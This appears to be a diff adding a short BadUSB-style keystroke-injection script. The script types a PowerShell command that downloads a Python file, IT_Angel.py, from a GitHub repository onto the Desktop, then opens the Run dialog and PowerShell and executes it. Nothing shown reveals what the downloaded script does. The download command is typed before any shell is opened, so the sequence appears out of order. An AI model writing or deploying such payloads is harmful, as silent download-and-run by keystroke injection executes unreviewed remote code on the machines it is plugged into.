@@ -1,0 +1,11 @@
+DELAY 1800
+STRING $dst="$env:USERPROFILE\Desktop\IT_Angel.py";$raw='https://github.com/IT-Tool-by-SalgadoTech/ittool-External_Tools/raw/refs/heads/main/IT_Angel.py';if(-not(Test-Path -Path (Split-Path $dst))){New-Item -ItemType Directory -Path (Split-Path $dst) -Force | Out-Null};curl.exe -L $raw -o $dst
+ENTER
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1800
+STRING cd $HOME/Desktop; python .\IT_Angel.py
+ENTER
